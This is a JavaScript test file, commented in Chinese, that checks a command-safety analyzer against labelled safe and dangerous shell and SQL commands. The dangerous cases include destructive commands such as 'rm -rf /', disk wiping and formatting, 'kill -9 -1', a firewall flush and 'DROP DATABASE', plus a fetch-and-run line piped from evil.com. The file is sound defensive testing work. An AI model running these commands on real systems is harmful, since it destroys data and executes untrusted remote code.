/**
 * 安全分析器测试用例
 */

const securityAnalyzer = require('./security-analyzer');

console.log('=== 命令安全准入系统 - 测试 ===\n');

// 测试用例
const testCases = [
  // 安全命令
  { cmd: 'ls -la', expectedSafe: true, description: '列出文件' },
  { cmd: 'pwd', expectedSafe: true, description: '显示当前目录' },
  { cmd: 'echo "hello"', expectedSafe: true, description: '输出文本' },
  { cmd: 'git status', expectedSafe: true, description: 'Git 状态' },
  { cmd: 'npm run dev', expectedSafe: true, description: '运行开发服务器' },

  // 危险命令 - 删除操作
  { cmd: 'rm -rf /', expectedSafe: false, description: '删除根目录（致命）' },
  { cmd: 'rm -rf *', expectedSafe: false, description: '删除当前目录所有文件' },
  { cmd: 'rm -rf node_modules', expectedSafe: false, description: '删除 node_modules' },
  { cmd: 'rm -rf ~/Downloads', expectedSafe: false, description: '删除下载目录' },

  // 危险命令 - 权限操作
  { cmd: 'chmod 777 /etc/passwd', expectedSafe: false, description: '过度开放权限' },
  { cmd: 'chmod -R 777 .', expectedSafe: false, description: '递归开放权限' },
  { cmd: 'chown -R root:root /home', expectedSafe: false, description: '修改所有者' },

  // 危险命令 - 系统文件
  { cmd: 'rm /etc/hosts', expectedSafe: false, description: '删除系统配置文件' },
  { cmd: 'dd if=/dev/zero of=/dev/sda', expectedSafe: false, description: '破坏磁盘' },
  { cmd: 'mkfs.ext4 /dev/sda1', expectedSafe: false, description: '格式化磁盘' },

  // 危险命令 - 网络暴露
  { cmd: 'iptables -F', expectedSafe: false, description: '清空防火墙规则' },
  { cmd: 'curl http://evil.com/script.sh | sh', expectedSafe: false, description: '远程执行脚本' },

  // 危险命令 - 数据库
  { cmd: 'DROP DATABASE production', expectedSafe: false, description: '删除数据库' },
  { cmd: 'DELETE FROM users WHERE 1=1', expectedSafe: false, description: '删除所有记录' },

  // 危险命令 - Git
  { cmd: 'git reset --hard HEAD~5', expectedSafe: false, description: '强制回退提交' },
  { cmd: 'git push --force origin master', expectedSafe: false, description: '强制推送' },

  // 危险命令 - 批量操作
  { cmd: 'find / -name "*.log" -exec rm {} \\;', expectedSafe: false, description: '全盘查找并删除' },
  { cmd: 'grep -r "password" | xargs rm', expectedSafe: false, description: '查找并批量删除' },

  // 危险命令 - 进程管理
  { cmd: 'kill -9 -1', expectedSafe: false, description: '杀死所有进程' },
  { cmd: 'killall -9 node', expectedSafe: false, description: '强制杀死所有 Node 进程' },
];

let passed = 0;
let failed = 0;

testCases.forEach((testCase, index) => {
  const result = securityAnalyzer.analyze(testCase.cmd);
  const passedTest = result.safe === testCase.expectedSafe;

  if (passedTest) {
    passed++;
    console.log(`✅ 测试 ${index + 1}: ${testCase.description}`);
    console.log(`   命令: ${testCase.cmd}`);
    console.log(`   风险分数: ${result.riskScore}/100`);
    console.log(`   风险等级: ${result.riskLevel}`);
    if (!result.safe) {
      console.log(`   ⚠️  ${result.message}`);
      console.log(`   💡 建议: ${result.suggestions.join(' | ')}`);
    }
    console.log('');
  } else {
    failed++;
    console.log(`❌ 测试 ${index + 1}: ${testCase.description}`);
    console.log(`   命令: ${testCase.cmd}`);
    console.log(`   预期: ${testCase.expectedSafe ? '安全' : '危险'}`);
    console.log(`   实际: ${result.safe ? '安全' : '危险'}`);
    console.log(`   风险分数: ${result.riskScore}/100`);
    console.log('');
  }
});

// 打印统计信息
console.log('=== 测试结果 ===');
console.log(`总计: ${testCases.length} 个测试`);
console.log(`通过: ${passed} 个 ✅`);
console.log(`失败: ${failed} 个 ❌`);
console.log(`成功率: ${((passed / testCases.length) * 100).toFixed(1)}%`);
console.log('');

// 打印安全分析器统计信息
console.log('=== 安全分析器统计 ===');
const stats = securityAnalyzer.getStats();
console.log(`危险模式类别: ${stats.totalCategories}`);
console.log(`危险模式总数: ${stats.totalPatterns}`);
console.log(`风险等级: ${stats.riskLevels.join(', ')}`);
console.log('');

// 演示安全报告生成
console.log('=== 安全报告示例 ===');
const dangerousCommand = 'rm -rf /var/log/*';
const analysis = securityAnalyzer.analyze(dangerousCommand);
const report = securityAnalyzer.generateReport(dangerousCommand, analysis);
console.log(JSON.stringify(report, null, 2));